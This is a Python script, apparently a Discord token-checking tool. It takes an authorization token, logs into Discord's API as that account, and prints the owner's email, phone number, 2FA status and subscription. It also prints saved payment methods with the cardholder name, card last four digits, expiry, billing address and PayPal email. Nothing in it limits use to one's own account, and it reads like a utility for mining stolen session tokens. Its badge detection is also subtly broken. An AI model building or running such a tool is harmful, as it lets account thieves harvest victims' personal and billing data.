import time, requests, os, sys
from colorama import Fore
from datetime import datetime

def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(0.040)
   
def tokeninfo():
    os.system('cls')
    global token
    token = input("Enter token:   ")

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
    }
    cc_digits = {
        'american express': '3',
        'visa': '4',
        'mastercard': '5'
    }
    r = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
    badges = ""
    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072
    if r.status_code == 200:
        flags = r.json()['flags']
        if (flags == Discord_Employee):
            badges += "Staff, "
        if (flags == Partnered_Server_Owner):
            badges += "Partner, "
        if (flags == HypeSquad_Events):
            badges += "Hypesquad Event, "
        if (flags == Bug_Hunter_Level_1):
            badges += "Green Bughunter, "
        if (flags == House_Bravery):
            badges += "Hypesquad Bravery, "
        if (flags == House_Brilliance):
            badges += "HypeSquad Brillance, "
        if (flags == House_Balance):
            badges += "HypeSquad Balance, "
        if (flags == Early_Supporter):
            badges += "Early Supporter, "
        if (flags == Bug_Hunter_Level_2):
            badges += "Gold BugHunter, "
        if (flags == Early_Verified_Bot_Developer):
            badges += "Verified Bot Developer, "
        if (badges == ""):
            badges = "None"
        r_json = r.json()
        user_name = f'{r_json["username"]}#{r_json["discriminator"]}'
        user_id = r_json['id']
        avatar_id = r_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = r_json['phone']
        email = r_json['email']
        mfa_enabled = r_json['mfa_enabled']
        flags = r_json['flags']
        locale = r_json['locale']
        verified = r_json['verified']
        
        language = languages.get(locale)
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)

        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
        billing_info = []

        for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=headers).json():
            yy = x['billing_address']
            name = yy['name']
            address_1 = yy['line_1']
            address_2 = yy['line_2']
            city = yy['city']
            postal_code = yy['postal_code']
            state = yy['state']
            country = yy['country']

            if x['type'] == 1:
                cc_brand = x['brand']
                cc_first = cc_digits.get(cc_brand)
                cc_last = x['last_4']
                cc_month = str(x['expires_month'])
                cc_year = str(x['expires_year'])
                
                data = {
                    'Payment Type': 'Credit Card',
                    'Valid': not x['invalid'],
                    'CC Holder Name': name,
                    'CC Brand': cc_brand.title(),
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }

            elif x['type'] == 2:
                data = {
                    'Payment Type': 'PayPal',
                    'Valid': not x['invalid'],
                    'PayPal Name': name,
                    'PayPal Email': x['email'],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }
            billing_info.append(data)

        printSlow(f"Account Information:")
        print("\n")
        time.sleep(1)  
        print(f"[Username]: {user_name}")
        print(f"[User ID]: {user_id}")
        print(f"[Creation Date]: {creation_date}")
        print(f"""[Avatar URL]: {avatar_url if avatar_id else ""}""")
        print(f"[Token]: {token}")
        print(f"[Nitro Status]: {has_nitro}")
        print(f"[Nitro Information]:")
        print(f"[Badges]{Fore.RESET}:      {badges}")
        if has_nitro:
            print(f"[Expires in]: {days_left} day(s)")
        else:
            print(f"[Expires in]: None day(s)\n")
        printSlow(f"Contact Information:")
        print("\n")
        time.sleep(1)
        print(f"""[Phone Number]: {phone_number if phone_number else ""}""")
        print(f"""[Email]: {email if email else ""}\n""")

        if len(billing_info) > 0:
            print(f"Billing Info:")
            if len(billing_info) == 1:
                for x in billing_info:
                    for key, val in x.items():
                        if not val:
                            continue
                        print(Fore.RESET + '    {:<23}{}{}'.format(key, Fore.CYAN, val))
            else:
                for i, x in enumerate(billing_info):
                    title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                    print('    ' + title)
                    print('    ' + ('=' * len(title)))
                    for j, (key, val) in enumerate(x.items()):
                        if not val or j == 0:
                            continue
                        print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.CYAN, val))

                    if i < len(billing_info) - 1:
                        print('\n')
            print('\n')
        printSlow(f"Account Security Features:")
        print("\n")
        time.sleep(1)
        print(f"[2FA/MFA Enabled]: {mfa_enabled}")
        print(f"[Flags]: {flags}")
        print("\n")
        time.sleep(1)
        printSlow(f"Misc:")
        print("\n")
        time.sleep(1)
        print(f"[Locale]: {locale} ({language})")
        print(f"[Email Verified]: {verified}")
    elif r.status_code == 401:
        printSlow(f"{Fore.LIGHTRED_EX}[Error]{Fore.RESET} Invalid token > {token}\n")
        time.sleep(2)
    else:
        printSlow(f"[{Fore.LIGHTRED_EX }[Error]{Fore.RESET} Error Accured trynna send requests\n")
        time.sleep(1)
    input(f"Press any Key to exit\n")
tokeninfo()